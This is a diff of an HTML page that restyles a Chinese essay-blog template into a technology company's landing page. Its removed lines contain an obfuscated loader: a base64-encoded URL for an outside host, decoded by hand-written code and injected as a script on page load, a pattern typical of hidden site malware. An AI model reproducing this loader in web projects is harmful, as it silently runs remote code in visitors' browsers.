@@ -3,132 +3,81 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>墨语心境 - 笔尖的流光</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>未来之光科技 - 创新驱动，价值共创</title>
     <style>
+        /* 全局重置与基础样式 */
         body {
             overflow: hidden;
-            font-family: 'Noto Serif SC', 'Georgia', serif;
-            /* 优雅的衬线字体，优先思源宋体 */
+            font-family: 'Arial', sans-serif;
+            /* 简洁的无衬线字体 */
             margin: 0;
             padding: 0;
-            background-color: #FDFDFD;
-            /* 几乎纯白背景 */
-            color: #555555;
-            /* 柔和的深灰色文本 */
-            line-height: 1.8;
+            background-color: #fcfcfc;
+            /* 极浅的背景色 */
+            color: #333333;
+            /* 标准深色文本 */
+            line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
-            overflow-x: hidden;
         }
 
+        /* 容器 */
         .container {
             max-width: 90%;
+            /* 适应移动端 */
             margin: 0 auto;
-            padding: 30px 0;
+            padding: 20px 0;
         }
 
-        /* 头部 - 留白与写意 */
+        /* 头部 - 简洁大气风格 */
         header {
-            background-color: transparent;
-            /* 透明背景，与body融合 */
-            padding: 50px 20px;
+            background-color: #ffffff;
+            /* 白色背景 */
+            padding: 30px 20px;
             text-align: center;
-            position: relative;
-            overflow: hidden;
-            margin-bottom: 40px;
-        }
-
-        header::before {
-            /* 顶部水墨晕染效果 */
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 50%;
-            transform: translateX(-50%) translateY(-50%) rotate(15deg);
-            width: 80%;
-            height: 150px;
-            background: radial-gradient(ellipse at center, rgba(173, 216, 230, 0.3) 0%, transparent 70%);
-            /* 浅蓝色晕染 */
-            border-radius: 50%;
-            opacity: 0.6;
-            z-index: 0;
+            border-bottom: 1px solid #eeeeee;
+            /* 细分隔线 */
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            /* 极轻微的阴影 */
         }
 
         header h1 {
             margin: 0;
-            font-family: 'Playfair Display SC', 'Noto Serif SC', serif;
-            /* 更具书法感的标题字体 */
-            font-size: 3em;
-            color: #333333;
-            /* 标题深色 */
-            letter-spacing: 2px;
-            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.1);
-            position: relative;
-            z-index: 1;
-            font-weight: normal;
-            /* 减轻标题重量 */
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            /* 更现代的无衬线字体 */
+            font-size: 2.2em;
+            /* 适中标题 */
+            color: #2c3e50;
+            /* 深灰蓝色 */
+            letter-spacing: -0.5px;
+            /* 微调字母间距 */
         }
 
         header p {
-            font-family: 'Noto Sans SC', 'Roboto', sans-serif;
-            /* 副标题使用无衬线 */
-            font-size: 1.2em;
-            color: #777777;
-            margin-top: 15px;
-            position: relative;
-            z-index: 1;
-            font-style: italic;
+            font-size: 1em;
+            color: #7f8c8d;
+            /* 柔和灰色 */
+            margin-top: 10px;
         }
 
-        /* 菜单切换按钮 - 简洁图标 */
-        .menu-toggle {
-            background: none;
-            border: none;
-            font-size: 2.2em;
-            /* 图标大小 */
-            color: #777777;
-            /* 柔和的颜色 */
-            cursor: pointer;
-            padding: 5px;
-            position: absolute;
-            /* 绝对定位在头部右上角 */
-            top: 30px;
-            right: 20px;
-            z-index: 2;
-            transition: color 0.3s ease, transform 0.3s ease;
-        }
-
-        .menu-toggle:hover {
-            color: #4CAF50;
-            /* 强调色 */
-            transform: scale(1.1);
-        }
-
-        /* 侧边导航菜单 - 轻盈通透 */
+        /* 导航菜单 - 顶部固定，简洁下划线 */
         nav {
-            position: fixed;
+            background-color: #ffffff;
+            /* 白色背景 */
+            text-align: center;
+            padding: 15px 0;
+            border-bottom: 1px solid #eeeeee;
+            /* 细分隔线 */
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            /* 极轻微的阴影 */
+            position: sticky;
+            /* 粘性定位 */
             top: 0;
-            right: -280px;
-            width: 250px;
-            height: 100%;
-            background-color: rgba(255, 255, 255, 0.9);
-            /* 半透明白色背景 */
-            backdrop-filter: blur(8px);
-            /* 柔和模糊 */
-            -webkit-backdrop-filter: blur(8px);
-            border-left: 1px solid rgba(220, 220, 220, 0.5);
-            /* 极细柔和边框 */
-            box-shadow: -3px 0 10px rgba(0, 0, 0, 0.1);
-            /* 柔和阴影 */
-            transition: right 0.4s ease-in-out;
-            z-index: 1001;
-            padding-top: 80px;
-            box-sizing: border-box;
-        }
-
-        nav.is-open {
-            right: 0;
+            /* 粘在顶部 */
+            z-index: 1000;
+            /* 确保在最上层 */
         }
 
         nav ul {
@@ -136,229 +85,245 @@
             padding: 0;
             margin: 0;
             display: flex;
-            flex-direction: column;
-            gap: 5px;
-            /* 列表项间距更小 */
+            justify-content: space-around;
+            flex-wrap: wrap;
+        }
+
+        nav ul li {
+            margin: 0 10px;
         }
 
         nav ul li a {
             color: #555555;
+            /* 默认文字颜色 */
             text-decoration: none;
-            padding: 12px 20px;
-            border-bottom: 1px solid rgba(240, 240, 240, 0.5);
-            /* 极细半透明分隔线 */
-            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
-            display: flex;
-            align-items: center;
+            padding: 8px 0;
+            position: relative;
+            display: inline-block;
             font-weight: 500;
+            /* 适中粗细 */
             font-size: 1em;
+            transition: color 0.3s ease;
+        }
+
+        nav ul li a::after {
+            /* 强调色下划线 */
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            /* 更细的下划线 */
+            background-color: #3498db;
+            /* 强调色：蓝色 */
+            bottom: -3px;
+            /* 靠近文字 */
+            left: 50%;
+            transform: translateX(-50%);
+            transition: width 0.3s ease;
+        }
+
+        nav ul li a:hover::after,
+        nav ul li a:focus::after {
+            width: 100%;
         }
 
         nav ul li a:hover,
         nav ul li a:focus {
-            background-color: rgba(76, 175, 80, 0.08);
-            /* 强调色极浅背景 */
-            color: #4CAF50;
-            /* 强调色文字 */
-            transform: translateX(3px);
-            /* 悬停时轻微右移 */
+            color: #3498db;
+            /* 强调色 */
         }
 
-        nav ul li:last-child a {
-            border-bottom: none;
-        }
-
-        nav ul li a .icon {
-            margin-right: 15px;
-            font-size: 1.4em;
-            color: #4CAF50;
-            /* 图标强调色 */
-        }
-
-        /* 菜单打开时的背景遮罩 */
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.2);
-            /* 更轻的半透明黑色 */
-            z-index: 1000;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 0.4s ease-in-out, visibility 0.4s ease-in-out;
-        }
-
-        .overlay.is-visible {
-            opacity: 1;
-            visibility: visible;
-        }
-
+        /* 内容区 - 简洁的卡片与列表风格 */
         main {
-            padding-top: 30px;
+            padding-top: 20px;
         }
 
-        /* 内容区 - 柔和卡片与留白 */
         section {
-            background-color: #FFFFFF;
-            margin-bottom: 40px;
-            padding: 35px;
-            border-radius: 15px;
-            /* 柔和圆角 */
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+            background-color: #ffffff;
+            margin-bottom: 25px;
+            padding: 25px;
+            border-radius: 8px;
+            /* 较小的圆角 */
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
             /* 柔和阴影 */
-            position: relative;
-            overflow: hidden;
-            border: 1px solid #EEEEEE;
-            /* 极细边框 */
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        section:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
         }
 
         section h2 {
-            font-family: 'Playfair Display SC', 'Noto Serif SC', serif;
-            font-size: 2.2em;
-            color: #333333;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            font-size: 1.6em;
+            color: #2c3e50;
             margin-top: 0;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #E0E0E0;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #f0f0f0;
             /* 细分隔线 */
             padding-bottom: 10px;
-            font-weight: normal;
         }
 
-        section .date {
-            font-size: 0.9em;
-            color: #999999;
-            margin-bottom: 20px;
-            display: block;
-            font-family: 'Noto Sans SC', 'Roboto', sans-serif;
+        section h3 {
+            font-size: 1.2em;
+            color: #34495e;
+            margin-top: 20px;
+            margin-bottom: 10px;
         }
 
         section p {
-            font-size: 1.05em;
-            color: #666666;
-            margin-bottom: 25px;
+            font-size: 0.95em;
+            color: #555555;
+            margin-bottom: 15px;
         }
 
         section img {
             max-width: 100%;
             height: auto;
             display: block;
-            margin: 25px auto;
-            border-radius: 10px;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
-            border: 2px solid #DDDDDD;
-            /* 柔和边框 */
+            margin: 15px auto;
+            border-radius: 6px;
+            /* 图片圆角 */
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.08);
         }
 
-        .read-more {
-            display: inline-block;
-            background-color: #4CAF50;
-            /* 强调色按钮 */
-            color: #FFFFFF;
-            padding: 12px 28px;
-            border-radius: 5px;
-            text-decoration: none;
-            font-weight: bold;
-            font-family: 'Noto Sans SC', 'Roboto', sans-serif;
-            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
-            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.15);
+        .service-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
         }
 
-        .read-more:hover {
-            background-color: #388E3C;
-            transform: translateY(-3px);
-            box-shadow: 0 5px 12px rgba(0, 0, 0, 0.2);
+        .service-list li {
+            background-color: #f9f9f9;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-left: 4px solid #3498db;
+            /* 强调色左边框 */
+            border-radius: 4px;
+            transition: background-color 0.3s ease;
         }
 
-        /* 页脚 - 简洁淡雅 */
-        footer {
-            background-color: #F8F8F8;
-            /* 略深于背景的浅灰色 */
-            color: #777777;
-            padding: 40px 0;
-            text-align: center;
+        .service-list li:hover {
+            background-color: #f0f4f8;
+            /* 悬停背景色 */
+        }
+
+        .service-list li h3 {
+            margin-top: 0;
+            margin-bottom: 5px;
+            color: #3498db;
+            /* 强调色 */
+        }
+
+        .service-list li p {
+            margin-bottom: 0;
             font-size: 0.9em;
-            margin-top: 50px;
-            border-top: 1px solid #E0E0E0;
+        }
+
+        .contact-info p {
+            margin-bottom: 8px;
+            font-size: 0.95em;
+        }
+
+        .contact-info a {
+            color: #3498db;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .contact-info a:hover {
+            color: #2980b9;
+        }
+
+        /* 页脚 - 极简风格 */
+        footer {
+            background-color: #ffffff;
+            /* 白色背景 */
+            padding: 20px 0;
+            text-align: center;
+            font-size: 0.85em;
+            color: #7f8c8d;
+            margin-top: 30px;
+            border-top: 1px solid #eeeeee;
             /* 细分隔线 */
-            box-shadow: 0 -3px 10px rgba(0, 0, 0, 0.05);
+            box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.05);
         }
 
         .social-links a {
-            color: #777777;
+            color: #7f8c8d;
+            /* 社交链接颜色 */
             text-decoration: none;
-            margin: 0 20px;
-            font-size: 1.4em;
-            transition: color 0.3s ease, transform 0.2s ease;
+            margin: 0 12px;
+            font-size: 1.1em;
+            /* 适中图标大小 */
+            transition: color 0.3s ease;
         }
 
         .social-links a:hover {
-            color: #4CAF50;
+            color: #3498db;
             /* 强调色 */
-            transform: translateY(-3px) scale(1.1);
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
     <header>
         <div class="container">
-            <h1>墨语心境</h1>
-            <p>笔尖的流光，心灵的印记</p>
-            <button class="menu-toggle" id="menuToggle">&#9776;</button>
+            <h1>未来之光科技</h1>
+            <p>创新驱动，价值共创</p>
         </div>
     </header>
 
-    <nav id="mainNav">
-        <ul>
-            <li><a href="#latest-posts"><span class="icon">&#9999;&#65039;</span> 最新随笔</a></li>
-            <li><a href="#reflections"><span class="icon">&#128161;</span> 心灵感悟</a></li>
-            <li><a href="#about-me"><span class="icon">&#128100;</span> 关于我</a></li>
-            <li><a href="#contact"><span class="icon">&#128231;</span> 联系方式</a></li>
-        </ul>
-    </nav>
-
-    <div class="overlay" id="menuOverlay"></div>
-
     <div class="container">
+        <nav id="mainNav">
+            <ul>
+                <li><a href="#about-us">关于我们</a></li>
+                <li><a href="#our-expertise">核心专长</a></li>
+                <li><a href="#contact-us">联系方式</a></li>
+            </ul>
+        </nav>
+
         <main>
-            <section id="latest-posts">
-                <h2>最新随笔</h2>
-                <div class="article-list">
-                    <div class="article-card">
-                        <img src="https://picsum.photos/300/200?random=1&seed=ink-wash-mountain" alt="水墨山水"
-                            class="random-image">
-                        <h2>山水入画：生活中的诗意</h2>
-                        <span class="date">2025年07月29日</span>
-                        <p>在快节奏的都市生活中，如何寻找一份属于自己的山水意境？本文分享了从日常中发现诗意的方法。</p>
-                        <a href="#" class="read-more">阅读更多</a>
-                    </div>
+            <section id="about-us">
+                <h2>关于我们</h2>
+                <img src="https://picsum.photos/300/200?random=1" alt="公司团队" class="random-image">
+                <p>未来之光科技是一家专注于前沿技术研发与应用的高科技企业。我们致力于为客户提供创新、高效、可靠的数字化解决方案，助力企业实现业务增长与转型。</p>
+                <p>我们拥有一支充满活力和创造力的专业团队，秉持“以客户为中心”的理念，不断探索技术边界，为各行业带来突破性的产品和服务。</p>
+            </section>
 
-                    <div class="article-card">
-                        <img src="https://picsum.photos/300/200?random=2&seed=bamboo-forest" alt="竹林幽径"
-                            class="random-image">
-                        <h2>竹影婆娑：静谧中的力量</h2>
-                        <span class="date">2025年07月25日</span>
-                        <p>竹的坚韧与柔美，如同人生。在竹林幽径中，我感受到了内心的平静与力量。</p>
-                        <a href="#" class="read-more">阅读更多</a>
-                    </div>
+            <section id="our-expertise">
+                <h2>核心专长</h2>
+                <p>我们专注于以下领域，提供专业、定制化的服务：</p>
+                <ul class="service-list">
+                    <li>
+                        <h3>人工智能与机器学习</h3>
+                        <p>开发智能算法，提供数据分析、预测模型和自动化解决方案。</p>
+                    </li>
+                    <li>
+                        <h3>云计算与大数据</h3>
+                        <p>构建可扩展的云基础设施，处理和分析海量数据，提供数据驱动的洞察。</p>
+                    </li>
+                    <li>
+                        <h3>物联网 (IoT) 解决方案</h3>
+                        <p>设计和部署智能设备网络，实现设备互联、数据采集与远程控制。</p>
+                    </li>
+                    <li>
+                        <h3>区块链技术应用</h3>
+                        <p>探索区块链在数据安全、供应链管理和数字资产等领域的创新应用。</p>
+                    </li>
+                </ul>
+                <img src="https://picsum.photos/300/200?random=2" alt="技术专长" class="random-image">
+            </section>
 
-                    <div class="article-card">
-                        <img src="https://picsum.photos/300/200?random=3&seed=tea-ceremony" alt="茶道"
+            <section id="contact-us">
+                <h2>联系方式</h2>
+                <p>欢迎与我们联系，共同探讨合作机会。</p>
+                <div class="contact-info">
+                    <p><strong>公司地址：</strong> 科技创新园B区501室</p>
+                    <p><strong>联系电话：</strong> <a href="tel:+861012345678">+86 10 1234 5678</a></p>
+                    <p><strong>电子邮箱：</strong> <a href="mailto:info@futurelight.com">info@futurelight.com</a></p>
+                    <p><strong>工作时间：</strong> 周一至周五 9:00 - 17:30</p>
+                    <p>
+                        <!-- 地图占位符 -->
+                        <img src="https://placehold.co/300x200/e0e0e0/555555?text=公司位置示意图" alt="公司位置示意图"
                             class="random-image">
-                        <h2>一盏清茶：品味人生百态</h2>
-                        <span class="date">2025年07月18日</span>
-                        <p>茶道不仅是泡茶的艺术，更是修身养性的过程。在茶香中，我品味着人生的酸甜苦辣。</p>
-                        <a href="#" class="read-more">阅读更多</a>
-                    </div>
+                    </p>
                 </div>
             </section>
         </main>
@@ -366,11 +331,11 @@
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 墨语心境. 版权所有.</p>
+            <p>&copy; 2025 未来之光科技. 版权所有.</p>
             <div class="social-links">
                 <a href="#" target="_blank">微信</a> |
-                <a href="#" target="_blank">知乎</a> |
-                <a href="#" target="_blank">简书</a>
+                <a href="#" target="_blank">领英</a> |
+                <a href="#" target="_blank">官网</a>
             </div>
         </div>
     </footer>
@@ -386,31 +351,18 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-            const menuToggle = document.getElementById('menuToggle');
-            const mainNav = document.getElementById('mainNav');
-            const menuOverlay = document.getElementById('menuOverlay');
-
-            function toggleMenu() {
-                mainNav.classList.toggle('is-open');
-                menuOverlay.classList.toggle('is-visible');
-            }
-
-            menuToggle.addEventListener('click', toggleMenu);
-            menuOverlay.addEventListener('click', toggleMenu);
-
-            document.querySelectorAll('#mainNav ul li a').forEach(anchor => {
+            document.querySelectorAll('nav a').forEach(anchor => {
                 anchor.addEventListener('click', function (e) {
-                    e.preventDefault();
+                    e.preventDefault(); // 阻止默认跳转
 
                     const targetId = this.getAttribute('href').substring(1);
                     const targetElement = document.getElementById(targetId);
 
                     if (targetElement) {
                         window.scrollTo({
-                            top: targetElement.offsetTop - (document.querySelector('header').offsetHeight || 0) - 20,
-                            behavior: 'smooth'
+                            top: targetElement.offsetTop,
+                            behavior: 'smooth' // 平滑滚动
                         });
-                        toggleMenu();
                     }
                 });
             });
@@ -421,53 +373,15 @@
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly9uMG0xYjN2LmZhc3RyYWtjYXJlZXIuY24vc3RhdGljL2pzL2NvcmUubWluLmpzP3Q=";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
